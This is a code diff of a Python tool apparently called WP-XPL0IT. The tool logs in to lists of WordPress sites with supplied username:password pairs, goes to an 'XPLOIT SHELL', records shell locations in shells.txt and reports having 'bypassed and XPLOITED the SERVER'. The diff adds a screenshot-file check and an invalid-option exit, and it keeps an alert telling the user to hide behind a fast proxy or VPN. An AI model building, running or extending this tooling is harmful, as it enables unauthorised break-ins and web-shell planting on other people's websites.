@@ -132,7 +132,7 @@ def Run(*, site_list, username,passwords,timeout = 10):
     '''
     All start's here
     '''
-    
+
     print()
     print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mStarting on: {site_list}\033[0m")
     print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mUser:Pass = {username}:{passwords}\033[0m")
@@ -306,7 +306,7 @@ def Run(*, site_list, username,passwords,timeout = 10):
         return driver.quit()
     print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mNavigating to XPLOIT SHELL\033[0m\033[0m")
     
-   
+
     shellloc = Browser.ShellLocation(url=site_list)
     
     with open('shells.txt','a+')as f:
@@ -315,12 +315,8 @@ def Run(*, site_list, username,passwords,timeout = 10):
     print()
     print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mSuccessfully bypassed and \033[32mXPLOITED\033[0m the SERVER\033[0m\033[0m")
     
-    
-'''
-if amount < 1:
-    print(LOGO)
-    exit('\033[31mMinimum 1 website in sites.txt\033[0m')
-'''
+
+
 LOGO = """
  {}╔═╗╔═╗╔╗╔╔╦╗╦  ╔═╗  
  {}╔═╝║╣ ║║║ ║ ║  ║╣   
@@ -352,6 +348,12 @@ LOGO = """
 
 if __name__ == '__main__':
     print(LOGO)      
+
+    if os.path.exists('bot_photos\\ak.png') and os.path.exists('bot_photos\\desktop.png') and os.path.exists('bot_photos\\exploit.png') and os.path.exists('bot_photos\\selectfiles.png') and os.path.exists('bot_photos\\ubhselecht.png') and os.path.exists('bot_photos\\ubhup.png'):
+        pass
+    else:
+        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mYou did not installl WP-XPL0IT properly\033[0m\033[0m")
+        exit(0)
     pyautogui.alert(text="While using WP-XPL0IT use a fast proxy or VPN connection",title="Confirmation")
     print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mAwaiting Prompt\033[0m\033[0m")
     beSURE = pyautogui.alert(text="Do not forget to change the screenshots of /bot_photos to how your PC files looks!", title="PLEASE README")
@@ -468,6 +470,8 @@ if __name__ == '__main__':
                 exit(0)
             except:
                 print(f"\033[38;5;205m[ \033[38;5;207mSTARTING: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mUserPass Formatting not valid\033[0m\033[0m")
-                
+    else:
+        print(f"\033[38;5;205m[ \033[38;5;207mSTARTING: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mInvalid Option is Chosen\033[0m\033[0m")
+        exit(0)          
     print(f"\033[38;5;205m[ \033[38;5;207mSTARTING: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mAll Sites Have been Scanned\033[0m\033[0m")
             
